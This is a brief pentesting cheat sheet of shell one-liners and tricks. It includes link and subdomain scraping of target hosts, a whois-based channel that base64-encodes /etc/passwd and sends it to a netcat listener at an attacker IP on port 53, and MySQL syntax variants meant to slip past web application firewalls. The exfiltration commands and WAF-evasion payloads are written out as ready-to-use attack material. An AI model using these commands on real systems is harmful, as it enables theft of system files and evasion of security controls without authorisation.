# Commands | snippets | utilitaries helpers for pentesting

# Linux

```bash
# Onliner to get links from the target itself
for h in $(cat hosts.txt); do curl -siL https://$h|sed -n -E "s/.*<.*(href|src|url)[=:]['\"]?([^'\">]+).*/\2/p" ; done
```

```bash
# Onliner to get subdomains and related from the target itself
for h in $(cat hosts.txt); do curl -siL https://$h|egrep -io  "[0-9a-z_\-\.]+\.([0-9a-z_\-]+)?`echo $h|awk -F '.' '{print $(NF-1)}'`([0-9a-z_\-\.]+)?\.[a-z]{1,5}"|sort -fu ; done
```

```bash
# Have limited ways to exfiltrate data ? Use Whois!
attacker: nc -l -v -p 53 | sed "s/ //g" | base64 -d

victim: whois -h $attackerIP -p 53 cat /etc/passwd | base64
```

# Windows

# Tricks

## MySQL trick to break some WAFs

```
SELECT-1e1FROM`test`
SELECT~1.FROM`test`
SELECT\NFROM`test`
SELECT@^1.FROM`test`
SELECT-id-1.FROM`test`
```
